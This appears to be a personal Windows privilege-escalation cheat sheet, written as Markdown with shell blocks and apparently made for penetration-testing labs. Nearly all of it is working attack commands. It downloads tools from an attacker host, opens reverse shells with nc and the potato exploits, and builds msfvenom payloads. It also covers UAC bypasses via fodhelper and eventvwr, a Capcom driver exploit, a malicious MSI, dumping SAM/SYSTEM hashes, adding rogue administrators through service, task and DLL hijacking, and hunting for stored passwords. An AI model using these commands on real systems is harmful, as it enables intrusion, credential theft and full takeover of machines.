# ***Winpeas, PowerUp, PrivescCheck***
***Get these on the Target FIRST***
```shell
powershell -ep bypass

# Download
iwr -uri http://KALI_IP/windows/WinPeas.exe -outfile WinPeas.exe
iwr -uri http://KALI_IP/windows/PowerUp.ps1 -outfile PowerUp.ps1
iwr -uri http://KALI_IP/windows/PrivescCheck.ps1 -outfile PrivescCheck.ps1

# Run
.\WinPeas.exe

. .\PowerUp.ps1
Invoke-AllChecks

. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
```
# ***LHF***
## Impersonate/AssignPrimaryToken
***Try potato exploit if the above privs are there***
```shell
# 1 Check privs first
whoami /priv


######################
# PrintSpoofer64.exe #
######################
# A Reverse shell
PrintSpoofer.exe -c "C:\TOOLS\nc.exe KALI_IP7 1337 -e powershell"

# B No GUI
PrintSpoofer.exe -i -c cmd

# C GUI
qwinsta
PrintSpoofer.exe -d 3 -c "powershell -ep bypass"

# https://github.com/itm4n/PrintSpoofer


###################
# SigmaPotato.exe #
###################
# A Reverse Shell
.\SigmaPotato.exe --revshell KALI_IP 1234

# B Add local admin
.\SigmaPotato.exe "net user dave2 Password123 /add"
.\SigmaPotato.exe "net localgroup Administrators dave2 /add"


###################
# RoguePotato.exe #
###################
# A Reverse Shell exe
.\RoguePotato.exe -r KALI_IP -l 9999 -e C:\\Windows\\Temp\\reverse.exe

# B Reverse shell PS Encoded
.\RoguePotato.exe -r KALI_IP -l 9999 -e "powershell encoded"

# https://k4sth4.github.io/Rogue-Potato/


###################
# SweetPotato.exe #
####################
# A Reverse Shell
.\SweetPotato.exe [ -e EfsRpc ] -p .\nc.exe -a "KALI_IP 443 -e powershell"


# B Add local admin
.\SweetPotato.exe -p cmd.exe -a "net user dave2 Password123! /add"
.\SweetPotato.exe -p cmd.exe -a "net localgroup Administrators dave2 /add"

# https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all#bkmrk-sweetpotato


#######################
# compatibility check #
#######################
# 1 Check systeminfo
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

# then check the below link
# https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all
# https://jlajara.gitlab.io/Potatoes_Windows_Privesc
```
## Savedcred
***view any saved creds for quick use***
```shell
# 1 View potential saved creds
cmdkey /list

# A Reverse Shell
runas /savedcred /env /noprofile /user:SAVED_USER C:\path\to\reverse.exe
runas /savedcred /env /noprofile /user:DOMAIN\SAVED_USER powershell

# B GUI
runas /savedcred /env /noprofile /user:SAVED_USER powershell

# https://medium.com/@unowmie/konnichiwa-senpai-ef28789664eb
# https://juggernaut-sec.com/runas/
```
## UAC Bypass
***If you have Admin user but restricted by UAC, try this to get SYSTEM shell. w/ UAC, can't do mimikatz or change password etc so need to bypass***
```shell
# 1 CHECK for AutoElevate binaries. Examine mainfests
Get-ChildItem "C:\Windows\System32" -Filter "*.exe" | foreach { (Get-ItemProperty $_.FullName).VersionInfo.ProductName }

# 2 EXAMINE UAC, config for Admin, LocalAccountTokenFilterPolicy
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy

# Summary
EnableLUA=0
no UAC for anyone!!

EnableLua=1 LocalAccountTokenFilterPolicy=1
No UAC for anyone!!

EnableLUA=1 LocalAccountTokenFilterPolicy=0 FilterAdministratorToken=0
No UAC for RID 500 (Built-in Administrator)

EnableLua=1 LocalAccountTokenFilterPolicy=0 FilterAdministratorToken=1, 
UAC for everyone

# resources
# https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control#check-uac

#################
# Fodhelper.exe #
#################

# A LOLBAS One-hit wonder
powershell Start-Process cmd.exe -Verb runAs
Fodhelper.exe Bypass


# B Fodhelper.ps1 (cmd.exe default)
. .\FodhelperBypass.ps1
FodhelperBypass
FodhelperUACBypass -program "cmd.exe /c powershell.exe"


# C Manual
# 1 CHECK for Medium integrity
whoami /groups | findstr Level

# 2 SEARCH for fodhelper.exe
where [ /r C:\\windows ] fodhelper.exe

# 3 CHECK Powershell x86 or x64
powershell [Environment]::Is64BitProcess
C:\Windows\sysnative\cmd.exe #if above is false

# 4 ADD key
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ

# 5 CREATE payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f exe > fodhelper.exe

# 6 SET the key to our fodhelper.exe
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\PATH\TO\OUR\fodhelper.exe" /f

# 7 Try any of the below as attacks
cmd.exe /c "powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden"
cmd.exe /c "powershell Start-Process C:\Windows\SysWOW64\fodhelper.exe -WindowStyle Hidden"

C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden"
C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\SysWOW64\fodhelper.exe -WindowStyle Hidden"

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
Start-Process "C:\Windows\SysWOW64\fodhelper.exe" -WindowStyle Hidden

# https://topi.gitbook.io/t0pitheripper/master/windows-privesc/uac-bypass
# https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692


################
# Eventvwr.exe #
################
# A Using eventvwr-bypassuac.exe
# 1 FIND location
where /r C:\\windows eventvwr.exe

# 2 CHECK for autoelevate (look for true)
strings64.exe -accepteula C:\\Windows\\System32\\eventvwr.exe | findstr /i autoelevate

# 3 CREATE reverse.exe and eventvwr-bypassuac.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=`mip` LPORT=443 -f exe > reverse.exe
x86_64-w64-mingw32-gcc eventvwr-bypassuac.c -o eventvwr-bypassuac-64.exe

# 4 TRANSFER and run
.\eventvwr-bypassuac-64.exe 

# 5 PSEXEC w/ reverse.exe
.\psexec64.exe -i -accepteula -d -s C:\\programdata\\reverse.exe

# https://github.com/k4sth4/UAC-bypass


# B Using Invoke-EventViewer.ps1  (needs to be in C:\windows\Tasks folder)
. .\Invoke-EventViewer.ps1
Invoke-EventViewer cmd.exe | powershell.exe


# https://github.com/CsEnox/EventViewer-UACBypass/tree/main
# https://juggernaut-sec.com/uac-bypass/#UAC-Bypass_Using_netplwizexe_Help_Topics_GUI
```
## SeLoadDriverPriv
***Enable the priv, and using the exploit you get a reverse shell***
```shell
# 1 COPY the files over to writeable directory
iwr -uri http://KALI_IP/windows/eoploaddriver_x64.exe -outfile .
iwr -uri http://KALI_IP/windows/Capcom.sys -outfile .
iwr -uri http://KALI_IP/windows/ExploitCapcom.exe -outfile .


# 2 ENABLE the priv
.\eoploaddriver_x64.exe System\\CurrentControlSet\\dfserv C:\\Temp\\Capcom.sys


# 3 LOAD capcom
.\ExploitCapcom.exe LOAD C:\\Temp\\Capcom.sys


# 4 TEST
.\ExploitCapcom.exe LOAD C:\\Temp\\Capcom.sys


# 5 ATTACK
msfvenom -p windows/x64/shell_reverse_tcp LHOST=`mip` LPORT=443 -f exe > reverse.exe
.\ExploitCapcom.exe EXPLOIT reverse.exe


# https://github.com/k4sth4/SeLoadDriverPrivilege
```
## AlwaysInstallElevated
***If both keys below are 1, then exploitable w/ an evil.msi***
```shell
# A reverse shell
# 1 CHECK Winpeas, or manually
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

# 2 GENERATE a malicious .msi and transfer to victim
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f msi -o evil.msi

# 3 TRANSFER to writeable folder
iwr -uri http://KALI_IP/windows/evil.msi -outfile evil.msi

# a) msiexec
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi

# b) directly execute
.\evil.msi


# If doesn't work
# -> Try a Different port like 21
# -> CHECK Arch!! x86 or x64
# -> Try putting the file in tmp or the user's desktop
```
## SeBackupPriv
***Can Backup the SAM/SYSTEM file from a user who has this priv. Try to get the creds for this user using all the methods (AD attacks, regular Windows attacks etc) Example shows Kerberoasting a service account which had this priv***
```shell
# 1. EVIL-WINRM in and create diskshadow.txt using
evil-winrm -i 192.168.50.220 -u daveadmin -p "Password123"

echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append

# 2. Backup C: drive using diskshadow.exe:
diskshadow.exe /s c:\temp\diskshadow.txt

# 3. Extract SAM/SYSTEM using robocopy.exe 
robocopy /b Z:\Windows\System32\Config C:\temp SAM robocopy /b Z:\Windows\System32\Config C:\temp SYSTEM

# 4. Dowload to Kali
download .\SAM /opt/Juggernaut/JUGG-Backup/SAM
download .\SYSTEM /opt/Juggernaut/JUGG-Backup/SYSTEM

# 5. Crack
impacket-secretsdump -sam SAM -system SYSTEM LOCAL


# Another
# https://github.com/k4sth4/SeBackupPrivilege
```
## SeManageVolumePriv
```shell
# https://github.com/CsEnox/SeManageVolumeExploit
```
## Kernel Vulns 
***Search for potential kernel exploits using systeminfo and hotfixes***
```shell
wmic qfe get Caption,Description,HotFixID,InstalledOn
Get-HotFix | select Caption,Description,HotFixID,InstalledOn

# Some automated enumeration tools and walkthroughs:
# https://juggernaut-sec.com/kernel-exploits-part-1/#Windows_Exploit_Suggester_2
# https://juggernaut-sec.com/kernel-exploits-part-1/#Sherlockps1
```
# ***Quick Enum***
```shell
##################
# Users / Groups #
##################
whoami
hostname
net user [User]
net localgroup "Administrators" [ "Remote Desktop Users" | "Remote Management Users" ... ]
whoami /priv
whoami /groups

# If Low Mandatory level can write to
%USERPROFILE%\AppData\LocalLow\
```

```shell
##########
# System #
##########
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)"

# Check 64 bit or not
[System.Environment]::Is64BitProcess
[Environment]::Is64BitProcess
# switch if not
C:\Windows\sysNative\WindowsPowerShell\v1.0\powershell.exe -NoProfile
C:\Windows\sysnative\cmd.exe

# Hotfixes
wmic qfe get Caption,Description,HotFixID,InstalledOn
Get-HotFix | select Caption,Description,HotFixID,InstalledOn

# Drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

```shell
###########
# Network #
###########
ipconfig /all
route print
netstat -ano | findstr "LISTEN"

# Firewall profiles and their states
netsh advfirewall show allprofiles | findstr -i "profile state policy"

# open ports (if only specific listed, only those are open)
netsh firewall show config
```

```shell
######################
# Installed Programs #
######################
# 32-bit / 64 bit
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
wmic product get name,version | findstr /i /v "Microsoft"
```
# *dir / Get-ChildItem*
```shell
Get-ChildItem -Recurse -Hidden -ErrorAction SilentlyContinue -Force -Path C:\Users

cmd.exe /c dir /a[s] C:\

ls "C:\Program Files"
ls "C:\Program Files (x86)"

forfiles /P C:\Windows /S /M notepad.exe /C "cmd /C echo @PATH"
```
# *Files/Folders Search*
```shell
# C:\
# C:\Downloads
# C:\Users
# C:\Temp
# C:\xampp
# C:\Program Files\
# C:\Program Files (x86)\
# C:\Users\<User>\AppData\Local\Temp

###########################
# C:\Users, C:\SomeFolder #
###########################
Get-ChildItem -Path C:\Users\ -Recurse -Hidden -ErrorAction SilentlyContinue -Force

Get-ChildItem -Path C:\SomeFolder -Filter *.txt,*.pdf,*.kdbx,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.log,*.xml,*.old,*.bak -File -Hidden -ErrorAction SilentlyContinue -Force


#######
# C:\ #
#######
dir /a /sb C:\

cd C:\path\to\somefolder
dir /A /SB *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* == *user*


#######################
# Recent/Local folder #
#######################
Get-ChildItem -Path %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent -Recurse -Hidden -ErrorAction SilentlyContinue -Force

Get-ChildItem -Path C:\Users\<USERr>\AppData\Local\Temp -Recurse -Hidden -ErrorAction SilentlyContinue -Force
# try dir if needed


######################
# Powershell History #
######################
Get-History
(Get-PSReadlineOption).HistorySavePath
# Event Viewer; filter for ID 4104 for Script Block Logging
Event Viewer → Events from Script Block Logging are in Application and Services → Microsoft → Windows → PowerShell → Operational


##################################
# inetpub\wwwroot, apache, xammp #
##################################
Get-ChildItem -Path C:\inetpub\wwwroot -Recurse -Hidden -ErrorAction SilentlyContinue -Force
Get-Childitem -Recurse C:\apache | findstr -i "directory config txt php ps1 bat xml pass user"
Get-Childitem -Recurse C:\xampp | findstr -i "directory config txt php ps1 bat xml pass user"


#######
# ADS #
#######
dir /R


# Unattend (WinPeas will show)
C:\unattend.xml
C:\Windows\Panther\Unattend.xml**
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.xml
C:\Windows\system32\sysprep\sysprep.xml

```
# *Passwords search*
```shell
# C:\
# C:\Downloads
# C:\Users
# C:\Temp
# C:\xampp
# C:\inetpub
# C:\Program Files\
# C:\Program Files (x86)\
# C:\Users\<User>\AppData\Local\Temp


Get-ChildItem -Path "C:\Users" -Recurse | Select-String -Pattern "*passw*" | Select-Object Filename,LineNumber,Line

Get-ChildItem -Path "C:\Program Files" -Filter *.txt,*.ini,*.log,*.xml -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { findstr /si "passw pwd" $_.FullName | ForEach-Object {"$($_.FullName): $_"}}

findstr /si /n "passw pwd" C:\Users
# literal string
# findstr /si /n /C:"ENTER STRING" "C:\Users\*.*"

######################
# Search in Registry #
######################
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
reg query HKCU /f password /t REG_SZ /s
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /v password

##############
# Sam System #
##############
cd C:\
dir /sb SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK
icacls "C:\Windows\System32\Config\Regback"
```
# *Permissions*
```shell
#########################
# icacls Look for F,M,W #
#########################
icacls "C:\Path\To\Check"
icacls [folder/file] /reset /t /c # reset permissions
icacls [folder/file] /grant [user]:[permission] /t /c # grant/allow
icacls [folder/file] /deny [user]:[permission] /t /c ⇒ deny # this is useful if, for example, members of a group inherit access to a file but a specific user should be denied access.
icacls [folder/file] /remove [user]:[permission] /t /c # remove permission


########################################
# accesschk.exe look for WRITE or FULL #
########################################
accesschk.exe /accepteula -uwcqv <username> * | "C:\Program Files\Juggernaut\Juggernaut.exe"

accesschk.exe /accepteula -uwcqv "Authenticated Users" *


#######
# gci #
#######
# checks recursively if we have access to folders and files
gci -Recurse C:\users | Select FullName
```
# *Services / Procs*
## Enum
```shell
# Folder of interest
# C:\Program Files\<appname>
# C:\Program Files (x86)\<appname>
# C:\Temp
# C:\Users\<User>\AppData\Local\Temp

# Non Standard services
#########################
Get-WmiObject -class Win32_Service -Property Name,DisplayName,PathName,StartName,StartMode | Where {$_.PathName -notlike "C:\Windows*"} | select Name,DisplayName,PathName,StartName,StartMode

Get-CimInstance -class Win32_Service | Select Name,DisplayName,PathName,StartName,StartMode,AcceptStop | Where {$_.PathName -notlike "C:\Windows*"}
Get-CimInstance -ClassName Win32_Service | Select Name,DisplayName,PathName,StartName,StartMode | Where-Object {$_.Name -like 'NAME'}
Get-CimInstance -ClassName Win32_Service | Select Name,DisplayName,PathName,StartName,StartMode | Where-Object {$_.State -like 'Running'}

wmic service get name,displayname,pathname,startname,startmode | findstr /i /v "C:\Windows\\"


# Unquoted Servcies
#####################
Get-WmiObject -Class Win32_Service | Select-Object Name,DisplayName,PathName,StartName,StartMode | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.StartMode -eq "Auto" -and $_.PathName -notlike '"*'} | Measure-Object

Get-CimInstance -ClassName win32_service | Select Name,DisplayName,PathName,StartName,StartMode| Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.StartMode -eq "Auto" -and $_.PathName -notlike '"*'} | Measure-Object

wmic service get name,displayname,pathname,startname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v '"'


# From Registry
#################
reg query HKLM\SYSTEM\CurrentControlSet\Services
reg query HKLM\SYSTEM\CurrentControlSet\Services\<Service> /v ObjectName


############
# Using SC #
############
sc query #all
sc query [service] #status
sc qc [service] #configuration
sc [start/stop/delete] [service]
sc [create/delete] [service]
sc create [service] binpath="[executable]" start=auto
sc description [service] "[description]"
sc config [service] [option]=[value]

# PS
Stop-Service
Start-Service

# https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config

#############
# Processes #
#############
tasklist /svc # processes and associated services
tasklist /fi "username ne nt authority\system" /v # non-SYSTEM processes
tasklist /svc /fi "imagename eq svchost.exe"
tasklist /fi "pid eq [process ID]" #search by process ID
taskkill /f /im [process name] /t #kill process by name
taskkill /f /pid [process ID] /t #kill process by ID

wmic process get name,processid,executablepath

# PS
Get-Process | Select-Object -ExpandProperty Path
```
## Writeable Service binary
***Replace a weak-permissions service binary, which runs as LocalSystem or some other user besides basic user, with our reverse-shell binary and restart or reboot. Check for F, M, W permissions on:***
1. *User*
2. *Authenticated Users*
3. *Builtin/Users*
4. *Everyone*
5. *NT Authority/Interactive* 
```shell
# A Manual
# 1 FIND potential service binaries, check privs and startmode

# 2 CHECK Permissions (examples provided)
icacls FULL_PATH_TO_BINARY
icacls "C:\xampp\apache\bin\httpd.exe"
icacls "C:\xampp\mysql\bin\mysqld.exe"

# 3 COMPILE adduser.c if not already
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# 4 TRANSFER to target and copy to correct directoy
iwr -uri http://KALI_IP/windows/adduser.exe -outfile adduser.exe
move "C:\path\to\binary" binary.bak.exe
move .\adduser.exe "C:\path\to\binary"

# 5 TRY restarting the service or reboot 
# a) PS
Restart-Service 'SERVICE_NAME'

# b) net
net stop mysql
net start mysql

#
# 6 Check myadmin user is in Administrators group and RUN ADMIN powershell
$username = 'user'
$password = 'password'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
#
# no gui
Start-Process PowerShell -Credential $credential
#
# gui
Start-Process PowerShell -Runas

# https://stackoverflow.com/questions/28989750/running-powershell-as-another-user-and-launching-a-script



# B Powerup
# 1 View
Get-ModifiableSerivceFile

# 2 ATTACK
Install-ServiceBinary -Name 'SERVICE NAME'



# Notes
# If Restart fail check if you can reboot i.e SeShutdownPrivilege
#
whoami /priv
shutdown /r /t 0
```
## Unquoted Service path
***Add a malicious binary using the name before the spaces in the vulnerable path, as the name for our malicious binary***
***Check for F, M, W permissions on:***
1. *Username*
2. *Authenticated*
3. *Builtin/Users*
4. *Everyone*
5. *NT Authority/Interactive*
```
C:\Program Files\My Program\My Service\service.exe
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```
```shell
# A Manual
# 1 Get potential unquoted-paths from
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
```
```shell
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName

# 2 CHECK permissions

# 3 IF PATH found, use the adduser.exe binary and restart or reboot
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# 4 TRANSFER and copy to correct dir (below just uses example)
iwr -uri http://KALI_IP/resources/adduser.exe -outfile adduser.exe
copy .\adduser.exe 'C:\Program Files\Enterprise Apps\Current.exe'

# 5 RESTART service
Stop-Service GammaService
Start-Service GammaService


# B Powerup
# 1 VIEW
Get-UnquotedService

# 2 ATTACK
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"



# Notes #
# If Restart fail check if you can reboot i.e SeShutdownPrivilege
whoami /priv
shutdown /r /t 0


# https://juggernaut-sec.com/unquoted-service-paths/
```
## Modifiable Service
```shell
# A Manual
# a) adduser.exe
# 1 COMPILE adduser.c if not already
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# 2 TRASNSFER to target and change permissions
iwr -uri http://KALI_IP/resources/adduser.exe -outfile adduser.exe
icacls .\adduser.exe /grant Everyone:F

# 3 CONFIG service to use adduser.exe and restart the service
sc config SERVICE_NAME binpath="C:\Users\PATH\TO\adduser.exe" obj=LocalSystem

# 4 CHECK service configured properly & restarrt
sc qc SERVICE_NAME
sc stop SERVICE_NAME
sc start SERIVCE_NAME


# b) Add current user as Local Admin
# 1 CONFIG service to add our current user as local admin
sc config SERVICE_NAME binpath="cmd /c net localgroup administrators USER /add" obj=LocalSystem

# 2 CHECK service configured properly & restart
sc qc SERVICE_NAME
sc stop SERVICE_NAME
sc start SERIVCE_NAME


# B PowerUp
# 1 GET such service
Get-ModifiableService

# 2 ATTACK
Invoke-ServiceAbuse -Name 'VULN_SERVICE'


# https://medium.com/r3d-buck3t/privilege-escalation-with-insecure-windows-service-permissions-5d97312db107
```
## Dll Hijack
***Check for missing DLLs from LOGS or from installed application and then replace if a missing DLL message appears. Order of replacement is:***
1. *Application directory.*
2. *System directory (GetSystemDirectory to view path)*
3. *16-bit system directory.*
4. *Windows directory (GetWindowsDirectory to view path)*
5. *Current directory.*
6. *PATH environment variable*
***The privileges the DLL will run with depend on the privileges used to start the application, so need admin user to TRIGGER the application***
```shell
# A Manual
# 1 CHECK WRITE permission to the application path (ex. using "FileZilla FTP Client" app)
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
type 'C:\FileZilla\FileZilla FTP Client\test.txt'

# 2 PROCOM (in Kali) to examine the DLL events and any filepaths they use as in below example
1 Process Name is Application.exe
2 Path contains Dll.dll | ends with .dll
3 Result contains | Filter by Functions (CreateFile example)

# 3 COMPILE the CPP file to a dll USING CORRECT DLL NAME example uses TextShaping.dll
x86_64-w64-mingw32-gcc mydll.cpp --shared -o TextShaping.dll

# 4 REPLACE DLL on TARGET using the correct path (using the order) and based on what the event is. Continuing w/ the FileZilla example
iwr -uri http://KALI_IP/resources/TextShaping.dll -outfile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'


# B Get-PotentialDLLHijack.ps1
# 1 Use procmon as above but save data to csv and transfer to TARGET

# 2 Run and examine the output
. .\Get-PotentialDLLHijack.ps1
Get-PotentialDLLHijack -CSVPath .\Logfile.CSV -MaliciousDLLPath .\DLLHijackTest.dll -ProcessPath "C:\Users\John\AppData\Local\Programs\Microsoft VS Code\Code.exe"
 

# https://github.com/slyd0g/DLLHijackTest?tab=readme-ov-file
```
# *Scheduled Tasks*
## Enum Tasks
```shell
# A schtasks
# Gets the task RUN AS USER most importantly
schtasks /query /fo LIST /v | findstr /B /C:"Folder" /C:"TaskName" /C:"Next Run Time" /C:"Author" /C:"Task To Run" /C:"Run As User" /C:"Scheduled Task State" /C:"Schedule" /C:"Schedule Type" /C:"Repeat: Every" /C:"Comment"


# B Get-ScheduledTask
# Principal == RUN AS USER
# Actions.Execute == Executable Path
Get-ScheduledTask | where {$_.TaskPath -notlike  "\Microsoft*"} | Format-List TaskName,TaskPath,Actions,Actions.Execute,Triggers,State,LastRunTime,NextRunTime,Description,Enabled,Author,Principal


# C From Registry
$TaskRegistryPath="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"

$TaskName="TASK_NAME" # Replace with the task name
$SD=Get-ItemProperty -Path "$TaskRegistryPath\$TaskName" -Name "SD"

$Descriptor=New-Object System.Security.AccessControl.RawSecurityDescriptor ([System.Text.Encoding]::Default.GetString($SD.SD)) $Descriptor.DiscretionaryAcl | ForEach-Object { $_ }

# https://community.spiceworks.com/t/how-can-i-get-a-list-of-the-run-as-user-for-scheduled-tasks/938371
```
## Writeable Task
***USING ABOVE ENUM, Look for F, M, W on the files.***
***Important when querying:***
1. *Which principal is the task running as*
2. *Triggers specified for the task*
3. *Actions executed when one or more of these triggers are met*
```shell
# 1 SEARCH TASKS using Above ENUM


# 2 LOOK FOR for SUSCPICIOUS OR HIDDEN folders that may house scripts and look for permissions
gci -Recurse C:\users | Select FullName

Get-ChildItem -Path . -Force -Recurse | Where-Object { $_.Attributes -match 'Hidden' }

dir /s /a:h C:\


# 3. CHECK PERMISSIONS on the found task EX: 
icacls C:\path\to\SuscpiciousTask.exe
accesschk.exe /accepteula -uwcqv <username> * | "C:\Program Files\Juggernaut\Juggernaut.exe"


# 4 USE adduser.exe payload and replace the writeable file
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe


# 5 TRANSFER and replace the writeable task
iwr -uri http://KALI_IP/windows/adduser.exe -outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\


#
# 6 Check for "myadmin" in Administrators group
```

# *Logs*
```shell
# *.log, *.txt, *.conf, *.error, *.debug
# C:\Program Files\<appname>
# C:\Program Files (x86)\<appname>
# C:\Temp
# C:\Users\<User>\AppData\Local\Temp

# A Manual
$Directory="C:\ServiceOrAppFolder"; Get-ChildItem -Path $Directory -Filter *.log -Recurse | Select-Object FullName, LastWriteTime | Format-Table -AutoSize

$Directory = "C:\NonStandardPath"; Get-ChildItem -Path $Directory -Recurse -Include *.log, *.service -ErrorAction SilentlyContinue | Select-Object FullName, LastWriteTime | Format-Table -AutoSize


# B Reg
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName>" | Select-Object -Property *

Get-WinEvent -LogName System | Where-Object { $_.Id -in 7000, 7001, 7011, 7034, 7045 } | Select TimeCreated, Id, Message

Get-WinEvent -LogName System -MaxEvents 1000 | Where-Object { $_.Message -like "*service*" }

Get-WinEvent -LogName Application -MaxEvents 1000 | Where-Object { $_.Message -match "(?i)(log|service)" } | Select-Object TimeCreated, Id, LevelDisplayName, Message | Format-Table -AutoSize


# C EventViewer
eventvwr.msc → Windows Logs → System and Application
Filter for 7000, 7001, 7011, 7034, 7045
```
